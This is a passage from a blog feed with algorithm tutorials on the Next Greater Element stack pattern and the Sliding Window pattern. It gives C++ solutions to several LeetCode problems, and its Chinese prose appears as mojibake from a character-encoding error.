    <content><![CDATA[å‰è¨€èº«åœ¨å¤§ CS æ™‚ä»£ï¼Œæœ‰è¶Šä¾†è¶Šå¤šäººæŠ•å…¥åˆ·é¡Œçš„è¡Œåˆ—ï¼Œåœ¨çœ¼èŠ±æ’©äº‚çš„é¡Œæµ·ä¸­ï¼Œè¦æƒ³æœ‰æ•ˆç‡åœ°åˆ·é¡Œï¼ŒæŒæ¡ä¸¦é€šé”é¡Œç›®è§£æ³•èƒŒå¾Œï¼Œå¯ä»¥ä¸æ–·è¢«æ‹¿ä¾†ä½¿ç”¨çš„è§€å¿µï¼Œæ‰èƒ½åšåˆ°ä»¥ç°¡ç¦¦ç¹ã€‚
ç¹¼ä¹‹å‰å¯«éçš„ Two Pointer è·Ÿ Sliding Windowï¼Œä»Šå¤©è¦ä¾†è·Ÿå¤§å®¶ä»‹ç´¹å¦ä¸€ç¨®æ¼”ç®—æ³•çš„ pattern - Next Greater Elementã€‚
Next Greater Element çš„ç¬¬ä¸€å€‹ç¯„ä¾‹ - Leetcode #496 - Next Greater Element Ié¡Œç›®æˆ‘å€‘å…ˆçœ‹ä¸€ä¸‹é¡Œç›®çš„æ•˜è¿°ï¼š

æš´åŠ›æ³•ä¸€é–‹å§‹æœ€ç›´è¦ºçš„æƒ³æ³•å°±æ˜¯å…ˆèµ°é nums1 çš„æ¯ä¸€å€‹ elementï¼Œç„¶å¾Œå°æ¯å€‹ element éƒ½å» nums2 æœå°‹ä½ç½®ï¼Œä¸¦æ‰¾åˆ° next greater elementï¼Œæ™‚é–“è¤‡é›œåº¦æ˜¯ O(mn)ï¼Œç©ºé–“è¤‡é›œåº¦æ˜¯ O(1)ã€‚
Stack è§£æ³•ä¸Šé¢çš„æš´åŠ›æ³•é›–ç„¶å¯ä»¥è§£æ±ºï¼Œä½†é€™é¡Œå…¶å¯¦å¯ä»¥ç”¨æ›´å¥½çš„æ™‚é–“æ•ˆç‡ - O(m+n) çš„æ–¹å¼è§£æ‰ï¼Œä¸»è¦çš„æ–¹æ³•å°±åœ¨æ–¼æœå°‹ nums2 next greater element çš„æ–¹æ³•ï¼Œèˆ‰ä¾‹ä¾†èªªï¼š
nums1 = [1,2]nums2 = [6,2,1,5,4]

æˆ‘å€‘å¯ä»¥çœ‹åˆ°ï¼Œ5 åŒæ™‚æ˜¯ 2 è·Ÿ 1 çš„ next greater elementï¼Œæ‰€ä»¥å¦‚æœç”¨ä¸Šé¢çš„æš´åŠ›æ³•ï¼Œæˆ‘å€‘æœƒ

å…ˆåœ¨ nums2 ä¸­æ‰¾åˆ° 1ï¼Œç„¶å¾Œå¾€å¾Œæœå°‹ï¼Œæ‰¾åˆ° 5ã€‚
åœ¨ nums2 ä¸­æ‰¾åˆ° 2ï¼Œå¾€å¾Œæœå°‹ï¼Œæ‰¾åˆ° 5ã€‚

ç•¶ä½ ä»”ç´°è§€å¯Ÿé€™å…©æ­¥ï¼Œæœƒç™¼ç¾æœ‰äº›å†—é¤˜çš„åœ°æ–¹ï¼Œå› ç‚ºåœ¨ nums2 ä¸­ï¼Œ1 åœ¨ 2 å¾Œé¢ï¼Œä½†å»æ˜¯æ¯” 2 å°çš„ï¼Œæ‰€ä»¥å…¶å¯¦åœ¨é‡åˆ° 5 æ™‚å†ä¸€æ¬¡è¨˜éŒ„ 5 æ˜¯ 1 è·Ÿ 2 çš„ next greater element å°±å¥½ã€‚
è€Œè¦åšåˆ°é€™ç¨®è™•ç†ï¼Œå°±å¾ˆå®¹æ˜“è¯æƒ³åˆ° stackï¼Œå› ç‚º stack å¯ä»¥ä¾åºå„²å­˜çœ‹åˆ°çš„ elementï¼Œç„¶å¾Œå¾æœ€æ–°æ”¾å…¥çš„é–‹å§‹è™•ç†ã€‚
æ‰€ä»¥ï¼ŒåŸºæœ¬æ¦‚å¿µå°±æ˜¯ï¼Œåªè¦é‚„æ²’é‡åˆ°æ›´å¤§çš„ elementï¼Œæˆ‘å€‘å°±æŠŠå®ƒæ”¾é€² stackï¼Œç›´åˆ°é‡åˆ°æ¯” stack.top() æ›´å¤§çš„ï¼Œå°±å¯ä»¥æŠŠ stack ä¾åº pop å‡ºä¾†ï¼Œä¸¦æ›´æ–°ç­”æ¡ˆã€‚
å¦‚æœå·²ç¶“èµ°å®Œ nums2ï¼Œä½†é‚„ç•™åœ¨ stack ä¸­ï¼Œæˆ‘å€‘å°±çŸ¥é“é€™äº› element æ²’æœ‰ next greater elementã€‚
å¦å¤–å› ç‚ºè¦ output çš„ç­”æ¡ˆæ˜¯è¦ follow nums1 çš„ indexï¼Œæ‰€ä»¥æˆ‘å€‘éœ€è¦å…ˆç”¨ä¸€å€‹ Hash Table ä¾†å„²å­˜ nums1 çš„ &lt;value, idx&gt; pairã€‚
æˆ‘å€‘ä¾†çœ‹ä¸€ä¸‹ C++ çš„å¯¦ä½œï¼š
class Solution &#123;public:    vector&lt;int&gt; nextGreaterElement(vector&lt;int&gt;&amp; nums1, vector&lt;int&gt;&amp; nums2) &#123;        // Use a hash table to store the &lt;value, idx&gt;        unordered_map&lt;int, int&gt; table;        for(int i = 0; i &lt; nums1.size(); ++i) &#123;            table[ nums1[i] ] = i;        &#125;                // Use a stack to get next greater element efficiently        vector&lt;int&gt; ans(nums1.size(), -1);        stack&lt;int&gt; st;        for(int i = 0; i &lt; nums2.size(); ++i) &#123;            while( !st.empty() and st.top() &lt; nums2[i] ) &#123;                int cur = st.top();                st.pop();                                // If cur exists in table, it means cur is in nums1                // so we should update nums2[i] as the next greater element of cur                if(table.count(cur)) &#123;                    ans[ table[cur] ] = nums2[i];                &#125;            &#125;                        st.push(nums2[i]);        &#125;                return ans;    &#125;&#125;;

é€™é¡Œä¹Ÿç®—æ˜¯ stack çš„ä¸€å€‹å¯¦ç”¨æ¡ˆä¾‹ï¼Œè®€è€…å¯ä»¥å†ç¨ç¨é«”æœƒä¸€ä¸‹å¦‚æœæ²’æœ‰ stack é€™ç¨®æ“ä½œè³‡æ–™çš„æ¨¡å¼ï¼Œè™•ç†èµ·ä¾†æ˜¯ä¸æ˜¯æœƒæ¯”è¼ƒéº»ç…©ã€‚
Next Greater Element çš„ç¬¬äºŒå€‹ç¯„ä¾‹ - Leetcode #503 - Next Greater Element IIé¡Œç›®
é€™é¡Œè·Ÿä¸Šä¸€é¡Œæœ‰å…©å€‹å·®ç•°ï¼š

nums å¯ä»¥æœ‰ duplicate number
é€™é¡Œçš„ array æ˜¯ circular çš„

Stack è§£æ³•æ—¢ç„¶å·²ç¶“å­¸æœƒäº†å‰›å‰›çš„ stack è§£æ³•ï¼Œæˆ‘å€‘å°±ä¸çœ‹æš´åŠ›æ³•äº†ï¼Œç›´æ¥ä¾†ä¿®æ”¹ stack è§£æ³•ã€‚
é¦–å…ˆï¼Œå› çˆ²é€™é¡Œæœƒæœ‰ duplicate numberï¼Œæ‰€ä»¥æˆ‘å€‘ä¸èƒ½å†ç”¨ Hash Table ä¾†å„²å­˜ value è·Ÿ index pairï¼Œè€Œæ˜¯è¦æŠŠ idx è³‡è¨Šä¹Ÿç›´æ¥æ”¾åˆ° stack ä¸­ï¼Œé€™é‚Šæˆ‘å€‘åªè¦åœ¨ stack è£¡é¢å­˜ä¸€å€‹ pair å°±å¥½ã€‚
å†ä¾†è¦è™•ç†çš„æ±è¥¿å°±æ˜¯ circularï¼Œä¸éé€™ä¹Ÿä¸æœƒå¾ˆéº»ç…©ï¼Œæœ€å¤šå…¶å¯¦åªéœ€è¦èµ° nums å…©æ¬¡ï¼Œå°±å¯ä»¥è™•ç†å®Œç•¢ã€‚
ç¨‹å¼ç¢¼å¯¦ä½œå¦‚ä¸‹ï¼š
class Solution &#123;public:    vector&lt;int&gt; nextGreaterElements(vector&lt;int&gt;&amp; nums) &#123;        // Use a stack to get next greater element efficiently        vector&lt;int&gt; ans(nums.size(), -1);        stack&lt; pair&lt;int, int&gt; &gt; st; // store &lt;value, index&gt; to deal with duplicate values                // Go through array twice to handle circular property        for(int i = 0; i &lt; 2 * nums.size(); ++i) &#123;            int idx = i % nums.size();            while( !st.empty() and st.top().first &lt; nums[idx] ) &#123;                pair&lt;int, int&gt; cur = st.top();                st.pop();                                // Because we go through nums twice                // we might update some ans twice (which we do not desire)                // so we only update if ans[cur.second] == -1                if(ans[cur.second] == -1) &#123;                    ans[cur.second] = nums[idx];                &#125;            &#125;                        if(ans[idx] == -1) &#123;                st.push( make_pair(nums[idx], idx) );            &#125;        &#125;                return ans;    &#125;&#125;;

Next Greater Element çš„ç¬¬ä¸‰å€‹ç¯„ä¾‹ - Leetcode #739 - Daily Temperaturesé¡Œç›®
é€™é¡Œè¦æ±‚çš„æœ‰ä¸€é»é»ä¸ä¸€æ¨£ï¼Œæ˜¯è¦æ±‚ next greater element è·Ÿç›®æ¨™ element çš„ index å·®å€¼ã€‚
Stack è§£æ³•é€™é¡Œçš„è§£æ³•è·Ÿç¬¬ä¸€é¡Œå…¶å¯¦å·®ä¸å¤šï¼Œåªå·®åœ¨æ›´æ–° ans çš„æ™‚å€™ä¸æ˜¯å­˜é€² temperatureï¼Œè€Œæ˜¯ index çš„å·®å€¼ï¼Œç®—æ˜¯ä¸€å€‹å°å°çš„è®Šå½¢ï¼Œå¯ä»¥å†å¹«åŠ©å¤§å®¶ç†Ÿæ‚‰ä¸€ä¸‹é€™å€‹ patternã€‚
class Solution &#123;public:    vector&lt;int&gt; dailyTemperatures(vector&lt;int&gt;&amp; T) &#123;        // Use stack to store &lt;temperature, idx&gt; pair for O(n) calculation        vector&lt;int&gt; ans(T.size(), 0);        stack&lt; pair&lt;int, int&gt; &gt; st; // store &lt;temperature, index&gt;                // Go through T to search next greater element(temperature)        for(int i = 0; i &lt; T.size(); ++i) &#123;            while(!st.empty() and st.top().first &lt; T[i]) &#123;                pair&lt;int, int&gt; cur = st.top();                st.pop();                                // i is the next greater temperature of cur                ans[cur.second] = i - cur.second;            &#125;                        st.push(make_pair(T[i], i));        &#125;                return ans;    &#125;&#125;;

ç¸½çµå¸Œæœ›å¤§å®¶çœ‹å®Œä¹‹å¾Œï¼Œå¯ä»¥æ„Ÿå—åˆ°ç”¨ stack çš„æ–¹ä¾¿å’Œæ•ˆç‡ã€‚é«”é©—åˆ°é€™å€‹æ¼”ç®—æ³•å¥½ç”¨ã€å²å®³ï¼Œæ‰æœƒåœ¨è©²ç”¨çš„æ™‚å€™ï¼Œè‡ªç„¶è€Œç„¶åœ°ä½¿ç”¨ï¼Œæ¯”èµ·ç”¨èƒŒçš„ï¼ˆä¾‹å¦‚çœ‹åˆ°â€¦ï¼Œå°±è¦ç”¨â€¦ï¼‰ï¼Œæˆ‘è¦ºå¾—å»é«”é©—é€šé”å„ç¨®è§£æ³•ï¼Œè¦ºå¾—é…·åˆ°ä¸è‡ªè¦ºç¬‘å‡ºä¾†ã€æ„Ÿå—åˆ°è®šè®šè®šï¼Œå¯èƒ½å°±æ˜¯è®“æ¼”ç®—æ³•åŠŸåŠ›é€²åˆ°ä¸‹ä¸€å€‹å¢ƒç•Œçš„ç¾è±¡ã€‚
ä¸Šé¢æä¾›çš„ä¸‰é¡Œæ˜¯è®“å¤§å®¶åˆæ­¥é«”æœƒä¸€ä¸‹ stack çš„å¨åŠ›ï¼Œå¦‚æœä½ å°é€™å€‹ pattern æœ‰èˆˆè¶£ï¼Œå¯ä»¥å†å»çœ‹çœ‹å»¶ä¼¸é–±è®€çš„å¥½ stack é¡Œåˆ—è¡¨ã€‚è£¡é¢æœ‰ä¸å°‘ stack çš„é¡Œç›®ï¼Œå¦‚æœæŠŠé€™äº›é¡Œç›®ä¸€æ¬¡å¯«å®Œï¼Œå°æ–¼ stack çš„æŒæ¡åº¦æ‡‰è©²å°±å¤§å¤§æå‡äº†ï¼
å»¶ä¼¸é–±è®€
lee215 å¤§å¤§åˆ†äº«çš„å¥½ stack é¡Œåˆ—è¡¨

é—œæ–¼ä½œè€…ï¼š@pojenlai æ¼”ç®—æ³•å·¥ç¨‹å¸«ï¼Œå°æ©Ÿå™¨äººã€é›»è…¦è¦–è¦ºå’Œäººå·¥æ™ºæ…§æœ‰å°‘è¨±ç ”ç©¶ï¼Œæ­£åœ¨å­¸ç¿’ ç”¨å¿ƒé«”æœƒäº‹ç‰©çš„æœ¬è³ªè·Ÿ ä¸æ–·é€²å…¥å­¸ç”Ÿå¿ƒæ…‹æ”¹é€²ã€‚
]]></content>
      <tags>
        <tag>Algorithm</tag>
        <tag>Leetcode</tag>
        <tag>Software Engineer</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode åˆ·é¡Œ pattern - Sliding Window</title>
    <url>/2019/09/28/leetcode-pattern-sliding-window/</url>
    <content><![CDATA[å‰è¨€èº«åœ¨å¤§ CS æ™‚ä»£ï¼Œæœ‰è¶Šä¾†è¶Šå¤šäººæŠ•å…¥åˆ·é¡Œçš„è¡Œåˆ—ï¼Œåœ¨çœ¼èŠ±æ’©äº‚çš„é¡Œæµ·ä¸­ï¼Œè¦æƒ³æœ‰æ•ˆç‡åœ°åˆ·é¡Œï¼ŒæŒæ¡ä¸¦é€šé”é¡Œç›®è§£æ³•èƒŒå¾Œï¼Œå¯ä»¥ä¸æ–·è¢«æ‹¿ä¾†ä½¿ç”¨çš„è§€å¿µï¼Œæ‰èƒ½åšåˆ°ä»¥ç°¡ç¦¦ç¹ã€‚
ç¹¼ä¸Šæ¬¡çš„ Two Pointerï¼Œä»Šå¤©è¦ä¾†è·Ÿå¤§å®¶ä»‹ç´¹å¦ä¸€ç¨®æ¼”ç®—æ³•çš„ pattern - Sliding Windowã€‚
Sliding Window çš„ç¬¬ä¸€å€‹ç¯„ä¾‹ - Leetcode #209 - Minimum Size Subarray Sumé¡Œç›®æˆ‘å€‘å…ˆçœ‹ä¸€ä¸‹é¡Œç›®çš„æ•˜è¿°ï¼š

é€™é¡Œæ˜¯è¦æ‰¾åˆ°ä¸€å€‹æœ€å°çš„ subarrayï¼Œè€Œä¸”é€™å€‹ subarray çš„ element ç¸½å’Œå¿…é ˆè¦ &gt;&#x3D; sã€‚
æš´åŠ›æ³•æœ€ç›´è¦ºçš„æ–¹æ³•ç•¶ç„¶å°±æ˜¯æš´åŠ›æ³•å•¦ï¼Œæˆ‘å€‘å¯ä»¥åˆ—èˆ‰å‡ºæ‰€æœ‰å¯èƒ½çš„ subarrayï¼Œæª¢æŸ¥æ¯å€‹ subarray çš„ç¸½å’Œæ˜¯å¦ &gt;&#x3D; sï¼Œå¦‚æœ &gt;&#x3D; sï¼Œå†è·Ÿå·²ç¶“å‡ºç¾éæ»¿è¶³æ¢ä»¶æœ€å°çš„ subarray æ¯”å¤§å°ï¼Œå¦‚æœæ›´å°ï¼Œé‚£å°±å¯ä»¥æ›´æ–°æœ€å°å€¼ã€‚
å‡è¨­ input çš„ nums è£¡é¢æœ‰ n å€‹ elementï¼Œé€™æ¨£åšçš„æ™‚é–“è¤‡é›œåº¦æ˜¯ $O(n^3)$ï¼Œå› ç‚ºé™¤äº†è¦èŠ± $O(n^2)$ çš„æ™‚é–“åˆ—èˆ‰æ‰€æœ‰ subarrayï¼Œé‚„å¾—é‡è¤‡è¨ˆç®—æ¯å€‹ subarray çš„ sumã€‚
Sliding Window è§£æ³•æš´åŠ›æ³•é›–ç„¶ç°¡å–®ï¼Œå¯æ˜¯çœŸçš„å¤ªæ…¢äº†ï¼å¦‚æœæˆ‘å€‘ä»”ç´°è§€å¯Ÿæš´åŠ›æ³•çš„éç¨‹ï¼Œå°±æœƒç™¼ç¾æœ‰å¾ˆå¤š subarray sum æ˜¯é‡è¤‡è¨ˆç®—çš„ï¼æˆ‘å€‘çœ‹çœ‹ä¸‹é¢é€™å€‹ä¾‹å­ï¼š
nums = [2,3,1,2,4,3]æš´åŠ›æ³•åˆ—èˆ‰å‡ºçš„ subarrays =[2][2,3][2,3,1][2,3,1,2][2,3,1,2,4][2,3,1,2,4,3] [3][3,1][3,1,2][3,1,2,4][3,1,2,4,3] ......

ä¸é›£ç™¼ç¾ï¼Œå…¶å¯¦ä»¥ 2 ç‚ºé–‹é ­çš„ subarray è·Ÿä»¥ 3 ç‚ºé–‹é ­çš„ subarray å…¶å¯¦åªå·®åœ¨é–‹é ­æœ‰æ²’æœ‰é‚£å€‹ 2ï¼Œå¾Œé¢çš„æ•¸å€¼æ‡‰è©²è¦å¯ä»¥é‡è¤‡åˆ©ç”¨ï¼
æ‰€ä»¥æˆ‘å€‘å¯ä»¥ç”¨ windowStart è·Ÿ windowEnd å…©å€‹æŒ‡å‘ subarray é‚Šç•Œçš„æŒ‡é‡ï¼Œä¾†æ§åˆ¶æˆ‘å€‘ç¾åœ¨è¦çœ‹çš„ subarrayã€‚æ¼”ç®—æ³•å°±æ˜¯è¦å…ˆä¸€ç›´æ“´å¼µ windowEndï¼Œå¦‚æœç™¼ç¾ windowSum å·²ç¶“æ¯” s å¤§ï¼Œé‚£å°±é–‹å§‹ç¸®æ¸› windowï¼ˆä¹Ÿå°±æ˜¯æŠŠ windowStart å¾€å³ç§»ï¼‰ï¼Œç›´åˆ°èµ°åˆ° nums çš„å°¾å·´ã€‚å¯¦åšå‡ºä¾†çš„ç¨‹å¼ç¢¼å¦‚ä¸‹ï¼š
class Solution &#123;public:  int minSubArrayLen(int s, vector&lt;int&gt;&amp; nums) &#123;    int windowSum = 0, windowStart = 0;    int minWindowSize = numeric_limits&lt;int&gt;::max();    for(int windowEnd = 0; windowEnd &lt; nums.size(); windowEnd++) &#123;      windowSum += nums[windowEnd];            // å¦‚æœ subarray sum &gt;= sï¼Œé‚£å°±é–‹å§‹ç¸®æ¸› subarray      while(windowSum &gt;= s) &#123;        minWindowSize = min(minWindowSize, windowEnd-windowStart+1);        windowSum -= nums[windowStart];        windowStart++;      &#125;    &#125;     return minWindowSize == numeric_limits&lt;int&gt;::max() ? 0 : minWindowSize;  &#125;&#125;;

ä½¿ç”¨é€™å€‹æ–¹æ³•ï¼Œå°±å®Œå…¨å»é™¤æ‰å†—é¤˜çš„è¨ˆç®—ï¼Œè®“æ™‚é–“è¤‡é›œåº¦ä¸‹é™åˆ° $O(n)$ï¼å‰›é–‹å§‹å­¸åˆ°é€™å€‹æ¼”ç®—æ³•çš„æ™‚å€™æœƒæ‡·ç–‘é€™æ¨£çœŸçš„èƒ½èµ°éæ‰€æœ‰å¯èƒ½çš„ subarray å—ï¼Ÿ
æˆ‘è¦ºå¾—å¤§å®¶å¯ä»¥é€éé€™å€‹ä¾‹å­è§€å¯Ÿï¼š
nums = [2,3,1,2,4,3], s = 7æš´åŠ›æ³•åˆ—èˆ‰å‡ºçš„ subarrays =[2][2,3][2,3,1][2,3,1,2] // WindowStart æœƒé–‹å§‹å¾€å³ç§»[2,3,1,2,4][2,3,1,2,4,3] ...

ä¸€é–‹å§‹ windowStart æŒ‡å‘ 2ï¼Œç„¶å¾Œ windowEnd æœƒæ…¢æ…¢æ“´å¼µï¼Œç•¶æ“´å¼µåˆ° [2,3,1,2] é€™å€‹æƒ…æ³æ™‚ï¼Œå› ç‚º sum å·²ç¶“ &gt;&#x3D; 7ï¼Œæ‰€ä»¥ windowStart æœƒé–‹å§‹å³ç§»ã€‚ä¹Ÿå°±æ˜¯èªªï¼ŒåŸæœ¬æš´åŠ›æ³•æœƒè€ƒæ…®çš„ [2,3,1,2,4] è·Ÿ [2,3,1,2,4,3] å°±ä¸æœƒè¢«è€ƒæ…®åˆ°ã€‚
å°±æ˜¯å› ç‚ºé€™ç¨®æƒ…æ³ï¼Œç›´è§€ä¸‹æœƒè¦ºå¾—æˆ‘å€‘é€™æ¨£ä¸å°±å°‘è€ƒæ…®åˆ°å¾ˆå¤šæƒ…æ³å—ï¼Ÿ
ä½†å¤§å®¶å¯ä»¥å†ä»”ç´°æƒ³æƒ³ï¼Œæˆ‘å€‘ç¾åœ¨è¦æ±‚çš„æ˜¯ sum &gt;&#x3D; s çš„æœ€å° subarrayï¼Œå¦‚æœ [2,3,1,2] å·²ç¶“æ»¿è¶³æ¢ä»¶äº†ï¼Œæˆ‘å€‘ç¹¼çºŒçœ‹ [2,3,1,2,4] è·Ÿ [2,3,1,2,4,3] åˆæœ‰ä»€éº¼æ„ç¾©å‘¢ï¼Ÿç•¢ç«Ÿé€™å…©å€‹ subarray éƒ½å¤§æ–¼ [2,3,1,2] å•Šï¼
åªè¦æŠŠé€™é»æƒ³é€šäº†ï¼Œå°±ä¸æœƒå†æœ‰ç”¨ Sliding Window æ²’æœ‰è€ƒæ…®åˆ°æ‰€æœ‰ case çš„é€™ç¨®è®“å¿ƒè£¡éš±ç´„è¦ºå¾—ä¸å°çš„æƒ³æ³•ï¼æ¥è‘—è®“æˆ‘å€‘ç¹¼çºŒçœ‹ä¸‹å»ï¼Œæ›´åŠ ç†Ÿæ‚‰ Sliding Window å¯ä»¥æ‡‰ç”¨çš„å ´æ™¯ã€‚
Sliding Window çš„ç¬¬äºŒå€‹ç¯„ä¾‹ - Leetcode # 340 - Longest Substring with At Most K Distinct Charactersé¡Œç›®æˆ‘å€‘ä¾†çœ‹ä¸€ä¸‹é¡Œç›®ï¼š

æˆ‘å€‘è¦æ‰¾çš„æ˜¯æœ€å¤šæœ‰ K å€‹ä¸åŒ character çš„æœ€é•· substringã€‚æ³¨æ„ï¼Œé€™é¡Œæ˜¯ Hard é¡Œï¼Œä½†å¯«å®Œæœƒè¦ºå¾—æ²’é‚£éº¼ Hardã€‚
æš´åŠ›æ³•é€™é¡Œçš„æš´åŠ›æ³•æ‡‰è©²ä¸é›£æƒ³åˆ°ï¼Œæˆ‘å€‘å¯ä»¥åˆ—èˆ‰å‡ºæ‰€æœ‰çš„ substringï¼Œä¸€ä¸€æª¢æŸ¥æ¯å€‹ substring æ˜¯å¦åªæœ‰ &lt;&#x3D; K çš„ distinct charactersã€‚æ™‚é–“è¤‡é›œåº¦ä¸€æ¨£æ˜¯ $O(n^3)$ã€‚
Sliding Window è§£æ³•è·Ÿä¸Šé¢é‚£é¡Œå¾ˆåƒï¼Œæš´åŠ›æ³•å†—é¤˜ä¹‹è™•åœ¨æ–¼é‡è¤‡æª¢æŸ¥ characters æ˜¯å¦ distinctã€‚æ‰€ä»¥æˆ‘å€‘å¯ä»¥åœ¨æ“´å¼µ substring çš„æ™‚å€™ï¼Œå°‡ substring è£¡é¢çš„ character å’Œå‡ºç¾æ¬¡æ•¸å­˜èµ·ä¾†ï¼Œåˆ©ç”¨ Hash Table ä¾†è¨˜éŒ„ç›®å‰ substring æ˜¯å¦æœ€å¤šåªæœ‰ K å€‹ distinct charactersã€‚
é€™é‚Šä¹‹æ‰€ä»¥è¦ç”¨ Hash Tableï¼Œè€Œä¸æ˜¯ç”¨ set ï¼Œæ˜¯æœ‰åŸå› çš„ï¼Œå¤§å®¶å¯ä»¥å…ˆæƒ³ä¸€ä¸‹ï¼Œå†å¾€ä¸‹çœ‹åŸå› ã€‚
å¥½ï¼æƒ³å®Œäº†å—ï¼Ÿç­”æ¡ˆæ˜¯ï¼Œå› ç‚ºè¦è™•ç† substring è£¡æœ‰ duplicate character çš„æƒ…æ³ï¼Œèˆ‰å€‹ä¾‹å­ï¼Œå‡è¨­ç›®å‰ substring æ˜¯ï¼š
a, c, a, b

å‡è¨­æŠŠ windowStart å¾€å³ç§»ï¼Œå°±æœƒåˆªæ‰ windowStart çš„ aï¼Œå¦‚æœæ˜¯ç”¨ setï¼Œé€™æ™‚å°±æœƒä»¥ç‚º substring è£¡æ²’æœ‰ a äº†ï¼Œä½†å…¶å¯¦å¾Œé¢é‚„æ˜¯æœ‰å€‹ aã€‚æ‰€ä»¥è‹¥ç”¨ setï¼Œæˆ‘å€‘å°±æœƒèª¤ä»¥ç‚ºåˆªæ‰äº† windowStart çš„ a ä¹‹å¾Œï¼Œå°±æ²’æœ‰ a äº†ã€‚
ä½¿ç”¨ Hash table å¯¦ä½œå¦‚ä¸‹ï¼š
class Solution &#123;public:  int lengthOfLongestSubstringKDistinct(string s, int k) &#123;    int maxLength = 0, windowStart = 0;    unordered_map&lt;char, int&gt; table;     for(int windowEnd = 0; windowEnd &lt; s.length(); windowEnd++) &#123;      table[s[windowEnd]] ++;       // table.size() &gt; k è¡¨ç¤ºæœ‰è¶…é k å€‹ distinct character      while(table.size() &gt; k) &#123;        if(--table[s[windowStart]] == 0)          table.erase(s[windowStart]);                  windowStart++;      &#125;       // ç¶“éä¸Šé¢çš„ while è¿´åœˆè™•ç†ï¼Œé€™æ™‚ window å¿…å®šæ»¿è¶³æ¢ä»¶      maxLength = max(maxLength, windowEnd-windowStart+1);    &#125;     return maxLength;  &#125;&#125;;

ç¨‹å¼ç¢¼æ˜¯ä¸æ˜¯å¾ˆç°¡æ½”å‘¢ï¼Ÿé€™å¯æ˜¯ä¸€é“ Hard é¡Œï¼Œå¦‚æœå° Sliding Window ä¸å¤ äº†è§£ï¼Œæˆ–æ˜¯ç„¡æ³•éˆæ´»åœ°è·Ÿ Hash Table åˆä½µä½¿ç”¨ï¼ˆCombo æŠ€ï¼ï¼‰ï¼Œé€™é¡Œå¯æ˜¯æ²’é‚£éº¼ç°¡å–®å–”ã€‚
Sliding Window çš„ç¬¬ä¸‰å€‹ç¯„ä¾‹ - Leetcode #3 - Longest Substring Without Repeating Charactersé¡Œç›®æˆ‘å€‘å…ˆçœ‹ä¸€ä¸‹é¡Œç›®çš„æ•˜è¿°ï¼š

æš´åŠ›æ³•æš´åŠ›æ³•æˆ‘å°±ä¸è´…è¿°äº†ï¼Œä¸€æ¨£ä¹Ÿæ˜¯åˆ—èˆ‰å‡ºæ‰€æœ‰çš„ substringï¼Œç„¶å¾Œæª¢æŸ¥ substring æœ‰æ²’æœ‰ repeating characterï¼Œæœ€å¾Œå°±èƒ½æ‰¾åˆ° longest substring without repeating charactersã€‚
Sliding Window è§£æ³•åŸºæœ¬ä¸Šï¼ŒSliding Window çš„å¯«æ³•è·Ÿå‰é¢å¾ˆåƒï¼Œéƒ½æ˜¯éœ€è¦è¨­ç½® windowStart è·Ÿ windowEndï¼Œä½†ä¸ä¸€æ¨£çš„åœ°æ–¹åœ¨æ–¼ï¼Œæˆ‘å€‘å¾—å…ˆç¢ºå®š windowEnd çš„ char ä¸åœ¨ substring ä¸­ï¼Œæ‰èƒ½æ“´å¼µ windowã€‚
å¯¦éš›åšæ³•ä¸Šï¼Œæˆ‘å€‘å¯ä»¥ç”¨ä¸€å€‹ set ä¾†å„²å­˜ç›®å‰ window è£¡é¢æœ‰çš„ charï¼Œç„¶å¾Œæ¯æ¬¡éƒ½è¦ç¢ºå®š window è£¡å·²ç¶“æ²’æœ‰é‡è¤‡çš„ charï¼Œæ‰æœƒç¹¼çºŒæ“´å¼µ windowã€‚å¯¦ä½œå¦‚ä¸‹ï¼š
class Solution &#123;public:  int lengthOfLongestSubstring(string s) &#123;    int n = s.length();    set&lt;char&gt; st;    int maxLen = 0, windowStart = 0, windowEnd = 0;     while(windowEnd &lt; n) &#123;      if(st.find(s[windowEnd]) == st.end()) &#123;        st.insert(s[windowEnd]);        maxLen = max(maxLen, windowEnd-windowStart+1);        windowEnd++;      &#125;      else &#123;        st.erase(st.find(s[windowStart]));        windowStart++;      &#125;    &#125;        return maxLen;  &#125;&#125;;

å¯¦ä½œèµ·ä¾†æ˜¯ä¸æ˜¯è®Šå¾—å¾ˆç°¡å–®äº†å‘¢ï¼Ÿå¦‚æœä½ æœ‰é€™ç¨®æ„Ÿè¦ºï¼Œé‚£æ­å–œä½ ï¼Œä½ å·²ç¶“é–‹å§‹ç¿’æ…£ Sliding Window çš„æ¼”ç®—æ³•é‹ä½œäº†ï¼
ç¸½çµå¸Œæœ›å¤§å®¶çœ‹å®Œä¹‹å¾Œï¼Œå¯ä»¥æ„Ÿå—åˆ° Sliding Window çš„æ–¹ä¾¿å’Œæ•ˆç‡ã€‚é«”é©—åˆ°é€™å€‹æ¼”ç®—æ³•å¥½ç”¨ã€å²å®³ï¼Œæ‰æœƒåœ¨è©²ç”¨çš„æ™‚å€™ï¼Œè‡ªç„¶è€Œç„¶åœ°ä½¿ç”¨ï¼Œæ¯”èµ·ç”¨èƒŒçš„ï¼ˆä¾‹å¦‚çœ‹åˆ°â€¦ï¼Œå°±è¦ç”¨â€¦ï¼‰ï¼Œæˆ‘è¦ºå¾—å»é«”é©—é€šé”å„ç¨®è§£æ³•ï¼Œè¦ºå¾—é…·åˆ°ä¸è‡ªè¦ºç¬‘å‡ºä¾†ã€æ„Ÿå—åˆ°è®šè®šè®šï¼Œå¯èƒ½å°±æ˜¯è®“æ¼”ç®—æ³•åŠŸåŠ›é€²åˆ°ä¸‹ä¸€å€‹å¢ƒç•Œçš„ç¾è±¡ã€‚
ä¸Šé¢æä¾›çš„ä¸‰é¡Œæ˜¯è®“å¤§å®¶åˆæ­¥é«”æœƒä¸€ä¸‹ Sliding Window çš„å¨åŠ›ï¼Œè€Œä¸”å¯ä»¥åˆæ­¥æŒæ¡ Sliding Window çš„æ¨¡æ¿è¦æ€éº¼å¯« - è¨­ç½® windowStart è·Ÿ windowEndï¼Œæœ€å¤–é¢çš„ for è¿´åœˆæ¯ä¸€è¼ªéƒ½æ“´å¼µ windowEndï¼Œä½†æ˜¯ç•¶æŸäº›æ¢ä»¶æ»¿è¶³æ™‚ï¼Œå°±è¦ç§»å‹• windowStart ä¾†ç¸®æ¸› windowã€‚
